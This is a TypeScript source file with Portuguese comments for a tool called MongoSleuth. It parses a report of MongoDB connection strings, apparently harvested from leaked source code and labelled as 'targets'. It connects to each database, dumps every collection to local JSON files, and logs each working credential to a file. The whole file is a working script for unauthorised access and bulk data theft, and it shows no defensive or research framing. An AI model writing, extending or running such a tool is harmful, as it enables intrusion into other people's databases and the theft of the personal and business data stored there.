import { MongoClient } from "mongodb";
import * as fs from "fs";
import * as path from "path";

export class MongoSleuth {
  private mongoOptions = {
    connectTimeoutMS: 5000,
    serverSelectionTimeoutMS: 5000,
  };

  // Novo parser específico para o seu relatório de privilégios
  private parsePrivilegesReport(
    rawText: string,
  ): { uri: string; dbs: string[] }[] {
    const blocks = rawText.split("---");
    const results: { uri: string; dbs: string[] }[] = [];

    for (const block of blocks) {
      const uriMatch = block.match(/URI:\s*(mongodb\+srv:\/\/[^\s\n]+)/i);
      const infoMatch = block.match(/INFO:\s*Bancos:\s*(.*)/i);

      if (uriMatch) {
        let uri: any;
        if (uriMatch[1]) uri = uriMatch[1].trim();
        // Limpeza básica de caracteres residuais
        uri = uri.replace(/[…\u2026]+$/, "");

        // Extrai a lista de bancos pré-identificada no relatório
        let dbs: string[] | any = [];
        if (infoMatch) {
          if (infoMatch[1])
            dbs = infoMatch[1]
              .split(",")
              .map((d) => d.trim())
              .filter((d) => d && !["admin", "local", "config"].includes(d));
        }

        results.push({ uri, dbs });
      }
    }
    return results;
  }

  async iniciar(inputPath: string) {
    if (!fs.existsSync(inputPath)) {
      console.error(`[-] Arquivo ${inputPath} não encontrado.`);
      return;
    }

    const rawText = fs.readFileSync(inputPath, "utf-8");
    const targets = this.parsePrivilegesReport(rawText);

    console.log(
      `[!] ${targets.length} alvos carregados do relatório. Iniciando Dump...\n`,
    );

    for (const target of targets) {
      try {
        // Passamos os bancos já conhecidos para evitar o listDatabases se não for necessário
        await this.processarUrl(target.uri, target.dbs);
      } catch (e: any) {
        console.log(`[-] Erro Crítico: ${e.message.substring(0, 50)}`);
      }
      console.log("-".repeat(50));
    }
  }

  private async processarUrl(uri: string, dbsPreLoaded: string[]) {
    // Correção de query string comum em leaks de código
    let cleanUri = uri;
    if (uri.includes("retryWrites=tru") && !uri.includes("retryWrites=true")) {
      cleanUri = uri.split("retryWrites=")[0] + "retryWrites=true";
    }

    const userMatch = cleanUri.match(/\/\/([^:]+):/);
    const userName: any = userMatch ? userMatch[1] : "unknown_user";

    const client = new MongoClient(cleanUri, this.mongoOptions);

    try {
      await client.connect();
      console.log(`[+] CONECTADO: ${userName}`);

      const userDir = path.join(process.cwd(), "dumps", userName);
      if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });

      // Se já temos os bancos do relatório, usamos eles. Caso contrário, tentamos listar.
      let dbsToScan = dbsPreLoaded;

      if (dbsToScan.length === 0) {
        try {
          const admin = client.db("admin").admin();
          const { databases } = await admin.listDatabases();
          dbsToScan = databases
            .map((d) => d.name)
            .filter((n) => !["admin", "local", "config"].includes(n));
        } catch {
          dbsToScan = ["test"];
        }
      }

      console.log(`    [*] Escaneando ${dbsToScan.length} bancos...`);

      let dumpRealizado = false;
      for (const dbName of dbsToScan) {
        const dbDir = path.join(userDir, dbName);
        if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });

        const docsCount = await this.dumpDatabase(client, dbName, dbDir);
        if (docsCount > 0) dumpRealizado = true;

        if (fs.existsSync(dbDir) && fs.readdirSync(dbDir).length === 0) {
          fs.rmdirSync(dbDir);
        }
      }

      if (dumpRealizado) this.logSucesso(cleanUri, userName);
    } catch (e: any) {
      console.log(`[-] Falha: ${userName} | ${e.message.substring(0, 60)}`);
    } finally {
      await client.close();
    }
  }

  // O método dumpDatabase permanece o mesmo que você já tem (usando streams)
  private async dumpDatabase(
    client: MongoClient,
    dbName: string,
    dbDir: string,
  ): Promise<number> {
    let countGlobal = 0;
    try {
      const db = client.db(dbName);
      const collections = await db.listCollections().toArray();

      for (const col of collections) {
        const fileName = path.join(dbDir, `${col.name}.json`); // .json é melhor para dumps
        const cursor = db.collection(col.name).find({});
        const stream = fs.createWriteStream(fileName);
        let countCol = 0;

        for await (const doc of cursor) {
          stream.write(JSON.stringify(doc) + "\n");
          countCol++;
        }
        stream.end();

        if (countCol > 0) {
          console.log(`      -> [${dbName}] ${col.name} (${countCol} docs)`);
          countGlobal += countCol;
        } else {
          // Pequeno delay para garantir que o stream fechou antes de deletar vazio
          setTimeout(() => {
            if (fs.existsSync(fileName)) fs.unlinkSync(fileName);
          }, 100);
        }
      }
    } catch {
      /* erro de permissão em collection específica */
    }
    return countGlobal;
  }

  private logSucesso(url: string, pasta: string) {
    const logMsg = `-----\nURL: ${url}\nPASTA: ${pasta}\nDATE: ${new Date().toISOString()}\n-----\n\n`;
    fs.appendFileSync("urlsDumps.txt", logMsg);
  }
}
